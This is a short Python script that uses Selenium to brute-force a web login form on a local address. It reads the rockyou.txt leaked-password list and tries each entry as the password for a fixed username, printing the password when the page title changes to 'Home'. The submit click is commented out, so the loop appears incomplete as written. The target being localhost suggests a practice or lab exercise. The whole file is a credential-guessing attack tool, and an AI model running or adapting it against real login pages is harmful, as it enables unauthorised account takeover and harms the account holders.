from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By


service = Service(executable_path='./chromedriver')

driver = webdriver.Chrome(service=service)

website = "http://127.0.0.1:4000/"

driver.get(website)

title=""

#passwords = ["sdfsdf", "dfsdf", "dfhjf","123"]

i = 0

with open('rockyou.txt','r', encoding='ISO-8859-1') as fin:
    lines = fin.readlines()
for passw in lines:
    #driver.get(website)
    #print("Testing this password", passw)

    usernameInput = driver.find_element(By.NAME, "username")
    passwordInput = driver.find_element(By.NAME, "password")
    
    usernameInput.clear()
    usernameInput.send_keys("sauterm5")
    passwordInput.clear()
    passwordInput.send_keys(passw)
    #driver.find_element(By.ID, "btn").click()

    #print("title", driver.title)
    
    if driver.title == "Home":
        print(f"Password is {passw}")
        break
    driver.get(website)

driver.quit()


